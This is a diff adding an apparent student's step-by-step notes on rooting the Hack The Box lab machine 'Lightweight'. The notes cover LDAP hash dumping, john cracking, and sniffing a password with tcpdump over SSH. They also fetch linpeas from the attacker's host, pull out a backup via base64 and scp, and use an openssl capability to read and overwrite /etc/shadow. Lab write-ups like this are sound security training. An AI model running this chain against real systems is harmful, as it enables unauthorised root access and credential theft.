@@ -1,0 +1,79 @@
+1.nmap-automator
+2.nmap scan --> nmap -T4 -sV -Pn -p- --script vuln 10.10.10.119 
+3.Accessing port 80:
+4.Using dirbuster --> 2.3 medium list
+5.nmap ldap script --> nmap -sV -p 389 --script ldap* -Pn 10.10.10.119
+for ldap enumeration --> https://book.hacktricks.xyz/pentesting/pentesting-ldap#:~:text=Default%20port%3A%20389%20and%20636,3268%2C%20and%203269%20for%20LDAPS.
+6. ldapsearch command:
+-->ldapsearch -x -h 10.10.10.119 -D '' -w '' -b "dc=lightweight,dc=htb"
+7.we found 2 users and their hash passwords:
+username: ldapuser1
+password:e2NyeXB0fSQ2JDNxeDBTRDl4JFE5eTFseVFhRktweHFrR3FLQWpMT1dkMzNOd2Roai5sNE16Vjd2VG5ma0UvZy9aLzdONVpiZEVRV2Z1cDJsU2RBU0ltSHRRRmg2ek1vNDFaQS4vNDQv
+hash password: {crypt}$6$3qx0SD9x$Q9y1lyQaFKpxqkGqKAjLOWd33Nwdhj.l4MzV7vTnfkE/g/Z/7N5ZbdEQWfup2lSdASImHtQFh6zMo41ZA./44/
+
+username: ldapuser2
+password: e2NyeXB0fSQ2JHhKeFBqVDBNJDFtOGtNMDBDSllDQWd6VDRxejhUUXd5R0ZRdmszYm9heW11QW1NWkNPZm0zT0E3T0t1bkxaWmxxeXRVcDJkdW41MDlPQkUyeHdYL1FFZmpkUlF6Z24x
+hash password: {crypt}$6$xJxPjT0M$1m8kM00CJYCAgzT4qz8TQwyGFQvk3boaymuAmMZCOfm3OA7OKunLZZlqytUp2dun509OBE2xwX/QEfjdRQzgn1
+8.website for decoding this --> https://www.base64decode.org/
+9.let's try to crack the using john --> pasting  both the hashes in a file called hashes.
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes
+10.Let's check the website again --> checking --> http://10.10.10.119/info.php and this --> http://10.10.10.119/user.php
+11.loging into ssh --> ssh 10.10.14.14@10.10.10.119 and password: 10.10.14.14
+12.running linpeas.sh --> wget http://10.10.14.14:8081/linpeas.sh 
+--> python3 -m http.server 8081
+-->chmod +x linpeas.sh
+13.Transfering LinEnum.sh to /tmp
+14.article on linux capabilities --> https://linux-audit.com/linux-capabilities-101/
+15.we got this from LinEnum.sh :
+[+] Files with POSIX capabilities set:
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/mtr = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
+16.Read about cap_net_admin and cap_net_raw+ep from here -->https://man7.org/linux/man-pages/man7/capabilities.7.html
+The “+ep” at the end stands for adding the capability as Effective and Permitted.
+e: Effective
+This means the capability is “activated”.
+p: Permitted
+This means the capability can be used/is allowed.
+17.This means we can run TCP dump on any of the port using this capability, let's try to get the password of LDAP using this
+TCPDUMP COMMAND: ssh 10.10.14.14@10.10.10.119 /usr/sbin/tcpdump -i any -U -w - 'not port 22' > tcpdump.cap   --> ON KALI MACHINE
+18.Go to 10.10.10.119 and visit user;info;status pages, this is because our account is being created and we will view the intercepted traffic using wireshark.
+19.after opening the file in wireshark we got the password of ldapuser2 : 8bc8251332abe1d7f105d3e53ad39ac2
+20.let's do su ldapuser2 
+21.got user flag
+22.in ldapuser2 we found a file backup.7z which is password protected, let's download it to our machine and crack it --> 
+scp 10.10.14.14@10.10.10.119:/home/ldapuser2/backup.7z /home/pulkittalwar2611/Pictures/lightweight-htb/backup.7z
+23.It shows permission denied now let's base64 encode it and then transfer it  --> cat backup.7z | base64
+24.creating a file backup.7z.base64 and saving it there.
+25.now decoding it on our local machine --> cat backup.7z.base64 | base64 --decode > backup.7z
+26.let's use john to crack the password
+27.installing this dependency --> apt install libcompress-raw-lzma-perl
+28.using this --> /usr/share/john/7z2john.pl backup.7z > backup_file
+29. and further using this --> john --wordlist=/usr/share/wordlists/rockyou.txt backup_file 
+30.we got this --> delete as the password.
+31.accessing backup.7z
+32.we got this password : ldapuser1 : f3ca9d298a553da117442deeb6fa932d
+33.running LinEnum.sh as ldapuser1
+34.POSIX CAPABILITIES:
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/sbin/mtr = cap_net_raw+ep
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/ldapuser1/tcpdump = cap_net_admin,cap_net_raw+ep
+/home/ldapuser1/openssl =ep
+35.we have ep permissions on openssl i.e effective and permitted.
+36.let's check gtfo bins for privilege escalation using openssl and read this --> https://int0x33.medium.com/day-44-linux-capabilities-privilege-escalation-via-openssl-with-selinux-enabled-and-enforced-74d2bec02099
+37.Reading the /etc/shadow : /home/ldapuser1/openssl enc -in "/etc/shadow"
+38.Generating a hash with the password as "password".
+-1: uses the MD5 based BSD password algorithm 1
+39.creating a new shadow file and copy all the data of /etc/shadow to it and replace the root hash by the new hash created i.e. $1$1Mo8wQD9$k2OI6vD05Drc6xPwfayLA.
+40.replacing new shadow file in /etc/shadow using openssl commands --> /home/ldapuser1/openssl enc -in shadow -out /etc/shadow
+41.su root and enter password as password 
+42.got root
+
+
